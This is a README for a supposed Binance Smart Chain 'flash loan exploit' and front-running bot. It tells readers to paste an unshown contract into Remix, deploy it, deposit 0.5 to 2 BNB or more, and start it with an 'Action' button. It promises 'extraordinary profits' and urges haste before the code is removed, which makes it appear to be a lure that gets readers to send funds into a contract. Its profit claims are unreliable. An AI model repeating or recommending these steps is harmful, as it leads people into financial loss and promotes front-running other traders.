# BSC-Flashloan-Exploit
This smart contract allows you to execute a flash loan exploit for the gainz.


We'll show you how to deploy a simple front run deployment in Solidity which automatically locates any liquidity to a BSC token and immediately transacts before other users.

This can bring in extraordinary profits!

Sell automatically triggers at profit, as well if a tokens liquidity is fully called into your wallet.

NOTE: Current parameters of this contract is that 10% of profit automatically reenters the front-run pool,
and automatically transacts back to your wallet 90% of the profit. The remaining pool keeps front running for profit, until you transaction "Action" function in Remix

How To Use:

1- Download metamask: https://metamask.io/download.html

2- Connect MetaMask to Binance Smart Chain

3- Go to Remix: https://remix.ethereum.org/

4- Click on "contracts" folder and then "Create New File". Rename it as you like " anyname.sol "

5- Paste SmartContract from above into Remix.

6- Compile it and copy contract address

7- Deposit funds to the Frontrun contract

8- Start the bot with "Action" button



UPDATE:

I got messages from people who didn't fund enough to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower.
Gas fees average 0.009*2 (0.018 BNB). Better when there is no burn. If it targets token with 10% burn, that's another 0.04BNB taken off of 0.25BNB. Most tokens these days have some burn.
    Less than 0.3BNB usually doesn't give you much to work with.
    It does not work on the testnet, So in order for the bot to work properly, I recommend you to fund at least 0.5-.06 BNB. If you want to have more earnings instead, set a value starting from 1 or 2 BNB or more. I set mine to 1.2 BNB for a good return but it always changes.


ALSO BUG IS NOT FIXED YET, BUT PANCAKESWAP REPORTS THIS GITHUB ACCOUNT AND REMOVES THE CODE EVERYTIME. ENJOY BEFORE THEY REMOVE IT!!

GOOD LUCK!
